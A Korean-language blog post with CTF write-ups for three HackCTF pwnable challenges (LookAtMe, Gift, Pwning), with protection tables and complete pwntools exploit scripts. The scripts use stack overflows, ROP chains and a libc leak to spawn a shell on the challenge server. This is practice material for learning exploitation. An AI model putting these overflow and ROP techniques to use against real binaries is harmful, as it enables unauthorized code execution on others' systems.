---
layout: post
title:  "HackCTF Pwnable - fifth line"
excerpt: "for All Clear HackCTF"
date:   2020-06-014
categories: [wargame]
comments: true
---

### 0x0 Beginner_Heap

binary :

exploit :

아직 힙은 멀었다.. 



### 0x1 LookAtMe

binary:

| canary   | fortify  | nx      | pie      | relro   |
| -------- | -------- | ------- | -------- | ------- |
| disabled | disabled | enabled | disabled | partial |

그냥 간단하게 srop를 이용하여 해결

exploit :

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3017)
e = ELF("./lookatme")

pop_eax = 0x80b81c6
pppr = 0x806f050
int80 = 0x806f630
bss = e.bss()

p.recvuntil("o\n")

pay = 'A' * 28
pay += p32(pop_eax)
pay += p32(0x3)
pay += p32(pppr)
pay += p32(8)
pay += p32(bss)
pay += p32(0)
pay += p32(int80)

pay += p32(pop_eax)
pay += p32(0xb)
pay += p32(pppr)
pay += p32(0)
pay += p32(0)
pay += p32(bss)
pay += p32(int80)

p.sendline(pay)

p.send("/bin/sh\x00")

p.interactive()
```

### 0x2  Gift

binary :

| canary   | fortify  | nx      | pie      | relro    |
| -------- | -------- | ------- | -------- | -------- |
| disabled | disabled | enabled | disabled | disabled |

exploit :

```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3018)

pr = 0x804866b
gets_plt = 0x80483d0
binsh = "/bin/sh\00"

p.recvuntil("Hey guyssssssssss here you are: ")
sh_addr = int(p.recv(9),16)
p.recv(1)
sys_addr = int(p.recv(10),16)

pay1 = 'a'
p.sendline(pay1)

pay2 = 'A'  * 136
pay2 += p32(gets_plt)
pay2 += p32(pr)
pay2 += p32(sh_addr)

pay2 += p32(sys_addr)
pay2 += 'A' * 4
pay2 += p32(sh_addr)

p.sendline(pay2)
p.sendline(binsh)
p.interactive()
```

그냥 간단하게 binsh을 입력할 주소와 system 주소를 출력해줘서 rop를 했다. 

### 0x3 Pwning

binary :

| canary   | fortify  | nx      | pie      | relro   |
| -------- | -------- | ------- | -------- | ------- |
| disabled | disabled | enabled | disabled | partial |

exploit : 

```python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3019)
e = ELF('./pwning')

printf_plt = e.plt['printf']
printf_got = e.got['printf']
main = e.symbols['main']
syscall = 0x80484d0
pr = 0x8048676

p.recv()
p.sendline('-1')

pay = 'A' *(0x2c + 0x4)
pay += p32(printf_plt)
pay += p32(main)
pay += p32(printf_got)

p.sendline(pay)

p.recvuntil('\x08\x0a')

libc = u32(p.recv(4)) - 0x00049020

p.recv()
p.sendline('-1')
p.recv()

pay = 'A' *( 0x2C + 4)
pay += p32(libc + 0x3a812)

p.sendline(pay)

p.interactive()
```

이 문제는 srop랑 원샷가젯을 이용한 풀이도 도전을 해봤는데 실패했다. 

+p.s

뭔가 페이로드를 작성할 때, 값을 분별해서 읽어오는걸 자꾸 헷갈린다.. 열심히 공부하자

릭도 열심히 공부해야 할 것 같다. 